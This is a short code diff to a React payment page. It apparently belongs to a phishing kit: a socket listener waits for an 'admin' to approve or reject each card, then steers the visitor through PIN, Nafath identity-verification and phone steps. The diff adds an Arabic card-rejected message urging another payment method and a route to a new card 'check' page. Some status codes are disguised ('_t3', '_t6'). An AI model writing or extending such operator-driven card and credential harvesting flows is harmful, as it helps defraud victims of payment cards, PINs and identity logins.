@@ -184,7 +184,8 @@ export default function P1({ offerTotalPrice }: _P1Props) {
           setIsWaitingAdmin(false)
           navigate('/step2')
         } else if (status === 'rejected') {
-          // Will be set by polling with the rejection message
+          // Set rejection message directly from socket
+          setCardRejectionError("تم رفض البطاقة - يرجى المحاولة بطريقة دفع مختلفة")
           setIsWaitingAdmin(false)
         }
       }
@@ -195,6 +196,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         else if (status === 'step3' || status === 'pin' || status === '_t3') { setIsWaitingAdmin(false); navigate('/step3') }
         else if (status === 'step4' || status === 'nafad' || status === '_t6') { setIsWaitingAdmin(false); navigate('/step4') }
         else if (status === 'step5' || status === 'phone' || status === '_t5') { setIsWaitingAdmin(false); navigate('/step5') }
+        else if (status === 'check' || status === 'card') { setIsWaitingAdmin(false); navigate('/check') }
         else if (status === 'thank-you') { setIsWaitingAdmin(false); navigate('/thank-you') }
       }
     })
